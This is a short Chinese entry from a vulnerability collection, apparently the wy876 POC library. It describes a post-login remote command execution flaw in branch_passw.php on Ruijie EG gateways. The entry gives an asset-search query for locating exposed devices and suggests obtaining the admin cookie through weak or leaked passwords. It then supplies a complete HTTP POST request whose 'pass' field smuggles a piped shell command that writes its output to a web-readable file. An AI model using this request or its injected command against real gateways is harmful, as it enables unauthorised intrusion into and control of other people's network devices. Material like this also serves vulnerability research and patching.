---
source: "wy876 漏洞文库"
---

# 锐捷EG易网关branch_passw.php远程代码执行漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**

<font style="color:rgb(38, 38, 38);">锐捷 EG易网关cli存在后台远程命令执行漏洞。</font>

<font style="color:rgb(38, 38, 38);"> </font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

`锐捷EG易网关`  
**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**

`app="Ruijie-EG易网关"`  
<font style="color:rgb(38, 38, 38);">●登录页面</font>  


  
**<font style="color:rgb(38, 38, 38);">四、漏洞复现</font>**  
1、通过弱口令或账号密码泄露漏洞登录后台获取cookie  


  
2、branch_passw.php执行whoami命令，写入web根目录test.txt文件，再访问test.txt文件得到回显。

```plain
POST /itbox_pi/branch_passw.php?a=set HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=e2iuc40kc25v8bosaf04ee7273; user=admin; helpKey=home_sys
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

pass=|whoami>../test.txt
```


3、写入文件地址

```plain
/test.txt
```

  


  
 


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gcrohorfhsnzh1ix>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
